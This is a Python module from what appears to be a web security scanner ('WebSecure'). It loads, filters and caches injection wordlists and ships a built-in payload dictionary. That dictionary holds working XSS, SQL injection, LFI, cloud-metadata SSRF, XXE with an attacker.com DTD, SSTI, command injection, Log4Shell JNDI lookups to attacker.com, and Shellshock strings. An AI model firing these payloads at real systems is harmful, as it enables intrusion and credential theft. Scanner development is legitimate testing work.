from __future__ import annotations
import logging
import os, json, re, subprocess, shlex, threading
from pathlib import Path
from typing import List, Iterable, Dict, Any

_logger = logging.getLogger(__name__)


def _to_path_or_none(v):
    """Normalize various root representations into pathlib.Path or None.
    Accepts str (whitespace-trimmed), PathLike, or Path. Empty strings -> None.
    """
    if v is None:
        return None
    if isinstance(v, (Path, os.PathLike)):
        return Path(v)
    if isinstance(v, str):
        s = v.strip()
        return Path(s) if s else None
    # Unknown type: refuse silently by returning None (keeps previous behavior of skipping missing roots)
    return None


# --- Config loading ---------------------------------------------------------

def _load_config_path() -> Path | None:
    env = os.getenv('WS_CONFIG')
    if env:
        p = Path(env)
        return p if p.exists() and p.is_file() else None
    local = Path('./config.json')
    return local if local.exists() and local.is_file() else None

def _load_cfg() -> dict:
    p = _load_config_path()
    if not p:
        return {}
    txt = p.read_text(encoding='utf-8', errors='ignore')
    return json.loads(txt) if txt.strip() else {}

def _read_lines(path: Path) -> list[str]:
    if not isinstance(path, Path):
        path = Path(path)
    if (not path.exists()) or (not path.is_file()):
        return []
    try:
        txt = path.read_text(encoding='utf-8', errors='ignore')
    except PermissionError:
        _logger.warning("[payloads] Permission denied reading wordlist: %s", path)
        return []
    except OSError as _e:
        _logger.error("[payloads] Cannot read wordlist %s: %r", path, _e)
        return []
    out: list[str] = []
    for line in txt.splitlines():
        s = line.strip()
        if not s or s.startswith('#'):
            continue
        out.append(s)
    return out

def _glob_many(root: Path, patterns: Iterable[str]) -> list[str]:
    out: list[str] = []
    for pat in patterns:
        for p in root.glob(pat):
            out.extend(_read_lines(p))
    return out

def _dedup_preserve(seq: Iterable[str], limit: int | None = None) -> list[str]:
    seen, out = set(), []
    for s in seq:
        s = (s or "").strip()
        if not s:
            continue
        if len(s) > 2048:  # sanity
            continue
        if s in seen:
            continue
        seen.add(s)
        out.append(s)
        if limit and len(out) >= limit:
            break
    return out

# --- Templating for placeholder tokens -------------------------------------

_MARK_TOKENS = ["§", "{{MARK}}", "{MARK}", "<MARK>", "{{XSS}}", "{{INJECT}}", "XSS_MARK", "FUZZ", "%%MARK%%"]

def _apply_marker(payloads: list[str], marker: str | None) -> list[str]:
    if not marker:
        return payloads
    out: list[str] = []
    for s in payloads:
        repl = s
        for tok in _MARK_TOKENS:
            if tok in repl:
                repl = repl.replace(tok, marker)
        out.append(repl)
    return out

# --- Defaults for common repos ---------------------------------------------

# Helper to find package root dynamically
def _get_package_root() -> Path:
    # payloads.py is in websecure/core/, so root is three levels up -> WebSecure (Project Root)
    return Path(__file__).resolve().parent.parent.parent


def _bundled_wordlists_root() -> Path:
    """Yerleşik wordlist dizini — yolların tek kaynağı paths.py üzerinden (frozen-aware).
    paths import edilemezse __file__-göreli yola düşülür (dev+frozen'da aynı dizine çözülür)."""
    try:
        from websecure.core.paths import wordlists_dir
        return wordlists_dir()
    except Exception:
        return _get_package_root() / "websecure" / "wordlists"


_PKG_ROOT = _get_package_root()

_DEFAULTS = {
    # Bundled high-quality wordlists — sole source, always available, no external dependency
    "bundled": {
        "root": _bundled_wordlists_root(),
        "git": None,
        # Injection payloads
        "xss":                  ["xss.txt"],
        "sqli":                 ["sqli.txt"],
        "lfi":                  ["lfi.txt"],
        "path_traversal":       ["lfi.txt"],
        "ssrf":                 ["ssrf.txt"],
        "xxe":                  ["xxe.txt"],
        "ssti":                 ["ssti.txt"],
        "nosqli":               ["nosqli.txt"],
        "cmdi":                 ["cmdi.txt"],
        "rce":                  ["cmdi.txt"],
        "open_redirect":        ["open_redirect.txt"],
        "redirect":             ["open_redirect.txt"],
        # Advanced / modern attack categories
        "deserialization":      ["deserialization.txt"],
        "deser":                ["deserialization.txt"],
        "log4j":                ["deserialization.txt"],
        "log4shell":            ["deserialization.txt"],
        "prototype_pollution":  ["prototype_pollution.txt"],
        "proto_pollution":      ["prototype_pollution.txt"],
        "graphql":              ["graphql.txt"],
        "gql":                  ["graphql.txt"],
        "http_smuggling":       ["http_smuggling.txt"],
        "smuggling":            ["http_smuggling.txt"],
        # Discovery / fuzzing
        "dirs":                 ["dirs.txt"],
        "files":                ["files.txt"],
        "common":               ["dirs.txt"],
        "wordlist":             ["dirs.txt"],
        # Parameter / value fuzzing
        "params":               ["params.txt"],
        "values":               ["values.txt"],
        "fuzz":                 ["params.txt", "values.txt"],
        # Auth
        "passwords":            ["passwords_top1000.txt"],
        "jwt_secrets":          ["jwt_secrets.txt"],
        "jwt":                  ["jwt_secrets.txt"],
        # Advanced SQLi
        "polyglot_sqli":        ["sqli.txt"],
        # Subdomain / path discovery
        "subdomains":           ["subdomains.txt"],
        "api_paths":            ["api_paths.txt"],
    },
}


# --- External sync (git clone/pull) ----------------------------------------

def _is_git_repo(path: Path) -> bool:
    return (path / ".git").exists()

def _run(cmd: str, cwd: Path | None = None, timeout: int = 120) -> tuple[int, str]:
    if not isinstance(cmd, str) or not cmd.strip():
        raise ValueError("cmd boş olamaz")
    if cwd is not None and not cwd.exists():
        raise FileNotFoundError(f"cwd yok: {cwd}")
    # check=False ile returncode döner; hatalar (örn. komut bulunamadı) istisna olarak yükselir
    try:
        proc = subprocess.run(
            shlex.split(cmd),
            cwd=str(cwd) if cwd else None,
            capture_output=True,
            text=True,
            timeout=timeout,
            check=False,
        )
        out = (proc.stdout or "") + (proc.stderr or "")
        return proc.returncode, out
    except subprocess.TimeoutExpired:
        return 124, f"Timeout expired after {timeout}s"
    except Exception as e:
        return 1, str(e)

def sync_wordlists(cfg: Dict[str, Any] | None = None) -> Dict[str, Any]:
    """
    Dış wordlist kaynaklarını senkronize eder (git clone/pull).
    config.payloads.sync:true ise çağrılması önerilir.
    """
    cfg = cfg or _load_cfg()
    pl_cfg = (cfg.get("payloads") or {}) if isinstance(cfg, dict) else {}
    roots = _provider_roots(pl_cfg)
    report = {}
    for name, sec in roots.items():
        root: Path = sec["root"]
        url = sec.get("git")
        root.parent.mkdir(parents=True, exist_ok=True)
        if root.exists() and _is_git_repo(root):
            try:
                code, out = _run("git pull --ff-only", cwd=root, timeout=60)
            except Exception as exc:
                code, out = 1, f"Skipped pull due to error: {exc}"
            report[name] = {"action": "pull", "code": code, "out": (out or "")[-2000:]}
        elif (not root.exists() or not any(root.iterdir() if root.exists() else [])) and url:
            # USER REQUEST: DISABLE AUTO-CLONE
            # print(f"[*] Cloning {name} from {url} (this may take a while)...")
            # code, out = _run(f"git clone --depth=1 {url} {str(root)}", cwd=root.parent, timeout=300)
            print(f"[!] Warning: Wordlist directory {root} missing/empty. Skipping download per user request.")
            report[name] = {"action": "skipped", "code": 0, "out": "Download disabled"}
        else:
            report[name] = {"action": "skip", "reason": "no git url or already present"}
    return report

# --- Technology-aware filter ------------------------------------------------

# Basit sezgisel eşleştirmeler (genişletilebilir)
_TECH_HINTS: Dict[str, Dict[str, Dict[str, Iterable[str]]]] = {
    # category -> tech_group -> {"include": [None], "exclude": [None]}
    "sqli": {
        "mysql": {"include": [r"(?i)\b(select|union|sleep\()", r"(?i)order\s+by", r"(?i)concat\("],
                  "exclude": [r"(?i)xp_cmdshell", r"(?i)';?\s*waitfor"]},
        "mssql": {"include": [r"(?i)';?\s*waitfor\s+delay", r"(?i)xp_cmdshell", r"(?i)sp_oacreate"],
                  "exclude": [r"(?i)concat\("]},
        "pgsql": {"include": [r"(?i)\bpg_sleep\(", r"(?i)\bgenerate_series\(", r"(?i)array\["], "exclude": []},
        "oracle": {"include": [r"(?i)dbms_pipe.receive_message", r"(?i)utl_http", r"(?i)union\s+select\s+null"],
                   "exclude": [r"(?i)pg_sleep\("]},
        "sqlite": {"include": [r"(?i)\bsqlite_", r"(?i)\bpragma\b"], "exclude": []},
    },
    "xss": {
        "react": {"include": [r"(?i)<svg", r"(?i)onload="], "exclude": [r"(?i){{", r"(?i)<script[^>]*>"]},
        "angular": {"include": [r"(?i){{", r"(?i)ng-app", r"(?i)svg onload"], "exclude": []},
        "vue": {"include": [r"(?i){{", r"(?i)v-on:", r"(?i)@click"], "exclude": []},
        "dom": {"include": [r"(?i)<img\s+src=x\s+onerror=", r"(?i)<svg/onload="], "exclude": []},
        "csp": {"include": [r"(?i)<svg", r"(?i)<img"], "exclude": [r"(?i)<script", r"(?i)javascript:"]},
    },
    "rce": {
        "linux": {"include": [r"(?i);\s*sh\b", r"(?i)\b/bin/sh\b", r"(?i)\bcat\s+/etc/passwd"],
                  "exclude": [r"(?i)cmd\.exe"]},
        "windows": {"include": [r"(?i)&\s*cmd\.exe", r"(?i)\bping\s+-n\b", r"(?i)\btype\s+C:\\\\"],
                    "exclude": [r"(?i)/bin/sh"]},
    },
}

def _match_any(patterns: Iterable[str], s: str) -> bool:
    for pat in patterns:
        if re.search(pat, s):
            return True
    return False

def filter_by_technology(payloads: list[str], category: str, tech_tags: Iterable[str] | None) -> list[str]:
    """
    Basit teknoloji farkındalığı: verilen tech_tags (ör. {'mysql','react','linux'}) için
    o kategoriye ait include/exclude sezgilerini uygular.
    """
    if not tech_tags:
        return payloads
    category = (category or "").lower().strip()
    rules = _TECH_HINTS.get(category) or {}
    tags = {t.lower() for t in tech_tags if t}
    # Birden çok teknoloji etiketinde birleşim: include herhangi biri, exclude herhangi biri
    includes: List[str] = []
    excludes: List[str] = []
    for t in tags:
        r = rules.get(t)
        if not r:
            continue
        includes.extend(list(r.get("include") or []))
        excludes.extend(list(r.get("exclude") or []))
    if not includes and not excludes:
        return payloads
    out: list[str] = []
    for s in payloads:
        ok = True
        if includes:
            ok = _match_any(includes, s)
        if ok and excludes:
            if _match_any(excludes, s):
                ok = False
        if ok:
            out.append(s)
    # Eğer aşırı daraltma olduysa, orijinal setten bir miktar fallback ekle
    if len(out) < max(20, len(payloads) // 20):
        out = _dedup_preserve(list(out) + payloads[:50], limit=len(out) + 50)
    return out

# --- Public API -------------------------------------------------------------

def _provider_roots(cfg_section: dict) -> dict:
    out = {}
    for prov in ["bundled"]:
        defaults = _DEFAULTS.get(prov, {})
        sec = cfg_section.get(prov, {}) if isinstance(cfg_section, dict) else {}
        root = Path(sec.get("root") or defaults.get("root") or _PKG_ROOT / "wordlists")
        entry: dict = {
            "root": root,
            "git": sec.get("git", defaults.get("git")),
        }
        # Copy all category keys from defaults, allowing config overrides
        for key, default_val in defaults.items():
            if key in ("root", "git"):
                continue
            entry[key] = sec.get(key) or default_val
        out[prov] = entry
    return out

def load_external_payloads(category: str, marker: str | None = None) -> list[str]:
    """
    category: 'xss','sqli','rce', veya ALLOWED_CATEGORIES içinde tanımlı diğerleri.
    Sağlayıcıların pattern haritaları üzerinden tarama yapar.
    """
    category = (category or "").lower().strip()

    # Kategori doğrulamasını esnet: bilinmeyen kategoride de config'e verilmiş pattern'ler kullanılabilir.
    cfg = _load_cfg()
    pl_cfg = (cfg.get("payloads") or {}) if isinstance(cfg, dict) else {}
    if not isinstance(pl_cfg, dict):
        return []

    # Tek provider: bundled (tüm wordlistler websecure/wordlists/ altında)
    providers = ["bundled"]

    roots = _provider_roots(pl_cfg)

    items: list[str] = []
    for prov in providers:
        sec = roots.get(prov) or {}
        raw_root = sec.get("root") if isinstance(sec, dict) else None
        root = _to_path_or_none(raw_root)
        if not root or not root.exists():
            continue
        pats = (sec.get(category) or []) if isinstance(sec, dict) else []
        items.extend(_glob_many(root, pats))

    # trim & dedup
    maxn = pl_cfg.get("max_per_category", os.getenv("WS_PAYLOADS_MAX", "500"))
    maxn = int(str(maxn)) if str(maxn).strip().isdigit() else 500
    dd = bool(pl_cfg.get("dedup", True))

    items = _apply_marker(items, marker)
    if dd:
        items = _dedup_preserve(items, limit=maxn)
    else:
        items = items[:maxn]
    return items

# --- Learned payloads (runtime feedback loop) -------------------------------
# config.fuzz.learning.enabled=true iken, onaylanmış (confirmed) bir enjeksiyon
# bulgusunun payload'ı learned.txt'ye `category<TAB>payload` olarak yazılır ve
# sonraki taramalarda o kategoride ÖNCELİKLE (listenin başında) denenir.
# Format kategori-bazlı olduğundan learned.txt normal wordlist glob'larına dahil
# DEĞİLDİR; yalnızca buradaki yardımcılar okur/yazar.

_LEARNED_LOCK = threading.Lock()
_LEARNED_CACHE: dict[str, list[str]] | None = None


def _learning_cfg() -> dict:
    cfg = _load_cfg()
    fz = (cfg.get("fuzz") or {}) if isinstance(cfg, dict) else {}
    lc = (fz.get("learning") or {}) if isinstance(fz, dict) else {}
    return lc if isinstance(lc, dict) else {}


def _learned_file_path() -> Path:
    lc = _learning_cfg()
    p = lc.get("learned_words_file")
    if p:
        try:
            pp = Path(str(p))
            if not pp.is_absolute():
                pp = _get_package_root() / pp
            return pp
        except Exception:
            pass
    return _bundled_wordlists_root() / "learned.txt"


def _read_learned_all() -> dict[str, list[str]]:
    global _LEARNED_CACHE
    if _LEARNED_CACHE is not None:
        return _LEARNED_CACHE
    out: dict[str, list[str]] = {}
    path = _learned_file_path()
    try:
        if path.exists() and path.is_file():
            for line in path.read_text(encoding="utf-8", errors="ignore").splitlines():
                s = line.strip()
                if not s or s.startswith("#"):
                    continue
                if "\t" in s:
                    cat, _, pl = s.partition("\t")
                    cat, pl = cat.strip().lower(), pl.strip()
                else:
                    cat, pl = "generic", s
                if pl:
                    out.setdefault(cat, []).append(pl)
    except Exception as e:
        _logger.debug("[payloads] learned.txt okunamadı: %r", e)
    _LEARNED_CACHE = out
    return out


def load_learned_payloads(category: str) -> list[str]:
    """Verilen kategori için öğrenilmiş (onaylanmış) payload'ları döndürür."""
    category = (category or "").lower().strip()
    return list(_read_learned_all().get(category, []))


def record_learned_payload(category: str, payload: str) -> bool:
    """Onaylanmış bir payload'ı learned.txt'ye ekler (config.fuzz.learning.enabled ise).
    Aynı (kategori,payload) zaten varsa tekrar eklemez. Eklendiyse True döner."""
    lc = _learning_cfg()
    if not bool(lc.get("enabled", False)):
        return False
    category = (category or "").lower().strip()
    payload = (payload or "").strip()
    if not category or not payload or len(payload) > 2048:
        return False
    with _LEARNED_LOCK:
        existing = _read_learned_all()
        if payload in existing.get(category, []):
            return False
        path = _learned_file_path()
        try:
            path.parent.mkdir(parents=True, exist_ok=True)
            with open(path, "a", encoding="utf-8") as f:
                f.write(f"{category}\t{payload}\n")
        except Exception as e:
            _logger.debug("[payloads] learned.txt yazılamadı: %r", e)
            return False
        existing.setdefault(category, []).append(payload)
    # payload cache'i bayatlamasın diye o kategoriye ait cache'leri temizle
    with _PAYLOAD_CACHE_LOCK:
        for ck in [k for k in _PAYLOAD_CACHE if k[0] == category]:
            _PAYLOAD_CACHE.pop(ck, None)
    return True


def get_payloads(
    category: str,
    *,
    marker: str | None = None,
    tech_tags: Iterable[str] | None = None,
    do_sync: bool | None = None,
) -> list[str]:
    """
    Yüksek seviye API:
      - do_sync True ise wordlist kaynaklarını git üzerinden senkronize eder.
      - dış payloadları yükler (Sağlayıcı: bundled — websecure/wordlists/).
      - technology-aware filtre uygular.
      - dedup & limit uygular (yükleme fonksiyonu içinde).
      - Aynı process içinde tekrar çağrılarda basit cache kullanır.
    """
    cfg = _load_cfg()
    pl_cfg = (cfg.get("payloads") or {}) if isinstance(cfg, dict) else {}

    if do_sync or (do_sync is None and bool(pl_cfg.get("sync", False))):
        sync_wordlists(cfg)

    ck = _cache_key(category, marker, tech_tags)
    with _PAYLOAD_CACHE_LOCK:
        if ck in _PAYLOAD_CACHE:
            return list(_PAYLOAD_CACHE[ck])

    items = load_external_payloads(category, marker=marker)

    if not items:
        items = get_builtin_payloads(category)
        if not items:
            _logger.warning(
                "[payloads] '%s' kategorisi için ne harici wordlist ne de builtin payload "
                "bulunamadı — scanner sıfır payload ile çalışacak. "
                "websecure/wordlists/ dizinini ve config.payloads.bundled.root ayarını kontrol edin.",
                category,
            )

    # Öğrenilmiş (önceki taramalarda onaylanmış) payload'ları LİSTENİN BAŞINA ekle —
    # böylece bu kategoride en çok işe yarayan payload'lar öncelikli denenir.
    try:
        learned = load_learned_payloads(category)
        if learned:
            learned = _apply_marker(learned, marker)
            items = _dedup_preserve(list(learned) + list(items))
    except Exception as _le:
        _logger.debug("[payloads] learned prepend atlandı: %r", _le)

    items = filter_by_technology(items, category, tech_tags)

    with _PAYLOAD_CACHE_LOCK:
        _PAYLOAD_CACHE[ck] = list(items)
    return items

__all__ = [
    "load_external_payloads",
    "get_payloads",
    "filter_by_technology",
    "sync_wordlists",
    "record_learned_payload",
    "load_learned_payloads",
]

# === PATCH: WebSecure Upgrade (auto-applied) @ 2025-09-07T16:43:08.489221 ===

# Genişletilmiş kategori desteği
ALLOWED_CATEGORIES = {
    "xss",
    "sqli",
    "polyglot_sqli",
    "rce",
    "nosqli",
    "ssti",
    "redirect",
    "cmdi",
    "lfi",
    "path_traversal",
    "ssrf",
    "open_redirect",
    "xxe",
    "deserialization",
    "deser",
    "log4j",
    "log4shell",
    "prototype_pollution",
    "proto_pollution",
    "graphql",
    "gql",
    "http_smuggling",
    "smuggling",
    # Discovery / fuzzing
    "dirs",
    "files",
    "params",
    "values",
    "fuzz",
    "wordlist",
    "common",
    # Auth
    "passwords",
    "jwt_secrets",
    "jwt",
    # Subdomain / path
    "subdomains",
    "api_paths",
}

_PAYLOAD_CACHE: dict[tuple[str, str | None, tuple[str, ...] | None], list[str]] = {}
_PAYLOAD_CACHE_LOCK = threading.Lock()

def _cache_key(category: str, marker: str | None, tech_tags: Iterable[str] | None) -> tuple[
    str, str | None, tuple[str, ...] | None]:
    return (category, marker, tuple(sorted([t for t in (tech_tags or []) if t])) or None)

def url_encode_twice(s: str) -> str:
    from urllib.parse import quote
    return quote(quote(s, safe=""), safe="")

def wrap_json(key: str, value: str) -> str:
    return '{"%s":"%s"}' % (key, value.replace('"', '\\"'))

def wrap_xml(tag: str, value: str) -> str:
    return f"<{tag}>{value}</{tag}>"

def form_urlencoded(k: str, v: str) -> str:
    from urllib.parse import urlencode
    return urlencode({k: v})

def multipart_probe(name: str, value: str, boundary: str = "----WebSecBoundaryX"):
    head = f"--{boundary}\r\nContent-Disposition: form-data; name=\"{name}\"\r\n\r\n"
    tail = f"\r\n--{boundary}--\r\n"
    return head + value + tail

# --- Built-in Payloads (Advanced/Polyglots) ---
BUILTIN_PAYLOADS = {
    "polyglot": [
        "javascript://%250Aalert(1)//\"/*\\'/*\\'/*--></script><xss>",
        "';WAITFOR DELAY '0:0:5'--",
        "\"><script>alert(1)</script>",
        "1;SLEEP(5)#",
        "1 OR 1=1",
        ";|/usr/bin/id|",
        "{{7*7}}",
        "${7*7}",
        "foo\" onmouseover=\"alert(1)",
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert(1) )//%0D%0A%0d%0a//",
    ],
    "xss": [
        "<script>alert(1)</script>",
        "\"><script>alert(1)</script>",
        "'><script>alert(1)</script>",
        "<svg/onload=alert(1)>",
        "<img src=x onerror=alert(1)>",
        "<iframe/src=javascript:alert(1)>",
        "<x onfocus=alert(1) autofocus>",
        "<details open ontoggle=alert(1)>",
        "<video src=x onerror=alert(1)>",
        "\" onmouseover=\"alert(1)",
        "' onmouseover='alert(1)",
        ";alert(1);//",
        "';alert(1);//",
        "javascript:alert(1)",
        "javascript:alert(document.domain)",
        "{{constructor.constructor('alert(1)')()}}",
    ],
    "sqli": [
        "'",
        "\"",
        "' OR '1'='1",
        "' OR 1=1--",
        "\" OR 1=1--",
        "' AND SLEEP(5)--",
        "'; WAITFOR DELAY '0:0:5'--",
        "' AND (SELECT 1 FROM pg_sleep(5))--",
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' ORDER BY 1--",
        "' ORDER BY 10--",
    ],
    "lfi": [
        "../etc/passwd",
        "../../etc/passwd",
        "../../../etc/passwd",
        "../../../../etc/passwd",
        "../../../../../etc/passwd",
        "..%2Fetc%2Fpasswd",
        "%2e%2e%2fetc%2fpasswd",
        "php://filter/read=convert.base64-encode/resource=index.php",
        "php://input",
        "/etc/passwd",
        "C:\\windows\\win.ini",
        "file:///etc/passwd",
    ],
    "ssrf": [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "http://127.0.0.1/",
        "http://localhost/",
        "http://0.0.0.0/",
        "http://[::1]/",
        "file:///etc/passwd",
        "dict://127.0.0.1:6379/info",
        "gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A",
    ],
    "xxe": [
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>",
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///windows/win.ini\">]><root>&xxe;</root>",
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><root>&xxe;</root>",
        "<?xml version=\"1.0\"?><foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include href=\"file:///etc/passwd\" parse=\"text\"/></foo>",
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\">%xxe;]><foo/>",
        "<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include parse=\"text\" href=\"file:///etc/passwd\"/></foo>",
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
    ],
    "ssti": [
        "{{7*7}}",
        "${7*7}",
        "#{7*7}",
        "<%= 7*7 %>",
        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
        "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        "{%import os%}${os.popen('id').read()}",
        "#set($x=7*7)${x}",
        "<%= `id` %>",
    ],
    "nosqli": [
        "[$ne]=1",
        "[$gt]=",
        "[$regex]=.*",
        "{\"$ne\": null}",
        "{\"$regex\": \".*\"}",
        "{\"$where\": \"1==1\"}",
        "' && '1'=='1",
        "' || '1'=='1",
        "'; return true; //",
    ],
    "cmdi": [
        "; id",
        "| id",
        "|| id",
        "& id",
        "&& id",
        "`id`",
        "$(id)",
        "; cat /etc/passwd",
        "& whoami",
        "; sleep 5",
        "& timeout /T 5 /NOBREAK",
        "%0a id",
        "| sleep 5",
    ],
    "polyglot_sqli": [
        # Single-db probes
        "'",
        "\"",
        "`;",
        # MySQL error-based
        "' AND extractvalue(1,concat(0x7e,version()))-- -",
        "' AND updatexml(1,concat(0x7e,(SELECT database())),1)-- -",
        # Time-based per DB
        "' AND SLEEP(3)-- -",
        "'; WAITFOR DELAY '0:0:3'-- -",
        "' AND (SELECT pg_sleep(3))-- -",
        "' AND 1=TO_NUMBER('x')-- -",
        # Union probes
        "' UNION SELECT NULL,NULL-- -",
        "' UNION SELECT NULL,NULL,NULL-- -",
        "' UNION SELECT 1,2,3-- -",
        # Stacked query
        "'; SELECT SLEEP(3)-- -",
        "'; WAITFOR DELAY '0:0:3';--",
        # OOB / OAST triggers (host replaced at runtime)
        "' AND LOAD_FILE(CONCAT('\\\\\\\\',@@hostname,'.oast.invalid\\\\x'))-- -",
        "'; EXEC master..xp_dirtree '//oast.invalid/ws'-- -",
        "' AND UTL_HTTP.REQUEST('http://oast.invalid/ws')='x'-- -",
        # Second-order markers
        "ws_poly_sqli'",
        "ws_poly_sqli\" OR \"1\"=\"1",
        # WAF bypass variants
        "' /*!AND*/ SLEEP(3)-- -",
        "'%09AND%09SLEEP(3)-- -",
        "' AND SLEEP(3)%23",
        "'/**/AND/**/1=1-- -",
        "' aND sLeEp(3)-- -",
        # Boolean
        "' AND 1=1-- -",
        "' AND 1=2-- -",
    ],
    "exploit": [
        "${jndi:ldap://127.0.0.1:1389/a}",
        "${jndi:dns://127.0.0.1:53/a}",
        "${jndi:ldap://127.0.0.1:1389/exploit}",
        "() { :;}; /bin/bash -c 'cat /etc/passwd'",
        "() { :;}; /bin/echo 'ShellShock'",
    ],
    "deserialization": [
        "${jndi:ldap://attacker.com/a}",
        "${jndi:dns://attacker.com/a}",
        "${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://attacker.com/a}",
        "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com/a}",
        "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==",
        "O:8:\"stdClass\":1:{s:4:\"test\";s:4:\"pwnd\";}",
        "!!python/object/apply:os.system ['id']",
        "\xac\xed\x00\x05",
        "aced0005",
    ],
    "prototype_pollution": [
        "{\"__proto__\": {\"polluted\": \"yes\"}}",
        "{\"__proto__\": {\"admin\": true}}",
        "{\"__proto__\": {\"role\": \"admin\"}}",
        "{\"constructor\": {\"prototype\": {\"admin\": true}}}",
        "__proto__[admin]=true",
        "constructor[prototype][admin]=true",
        "{\"__proto__\": {\"isAdmin\": true}}",
    ],
    "graphql": [
        "{\"query\": \"{ __schema { types { name } } }\"}",
        "{\"query\": \"{ users { id username password email } }\"}",
        "{\"query\": \"{ __type(name: \\\"User\\\") { fields { name } } }\"}",
        "{\"query\": \"mutation { createUser(username: \\\"admin\\\", role: \\\"admin\\\") { id } }\"}",
        "{\"query\": \"{ user(id: 1) { id username password apiKey } }\"}",
    ],
    "http_smuggling": [
        "Content-Length: 0\r\nTransfer-Encoding: chunked",
        "Transfer-Encoding: xchunked",
        "Transfer-Encoding: chunked\r\nTransfer-Encoding: identity",
        "POST / HTTP/1.1\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nSMUGGLED",
    ],
}

def get_builtin_payloads(category: str) -> List[str]:
    """Return hardcoded advanced payloads for a given category."""
    return list(BUILTIN_PAYLOADS.get(category, []))


# ---------------------------------------------------------------------------
# Adım 18 — PayloadEngine yeniden ihraç (backward compat)
# ---------------------------------------------------------------------------
# payload_engine.py içindeki yeni bileşenleri buradan da erişilebilir kıl.
# Mevcut kodda `from websecure.core.payloads import get_payloads` çalışmaya
# devam eder; yeni API için doğrudan `payload_engine` import edilebilir.

try:
    from websecure.core.payload_engine import (  # noqa: F401  (re-export)
        CMSFingerprinter,
        CMSPayloadProfile,
        CVEPayloadMap,
        EncodingVariantGenerator,
        MutationStrategy,
        PayloadEngine,
        PayloadMutationEngine,
        PayloadScorer,
        WordlistUpdater,
        cms_payloads,
        cve_payloads,
        detect_cms,
        encode_payload,
        get_engine,
        get_payloads_v2,
        mutate_payload,
    )
    _HAS_PAYLOAD_ENGINE = True
except ImportError:
    _HAS_PAYLOAD_ENGINE = False
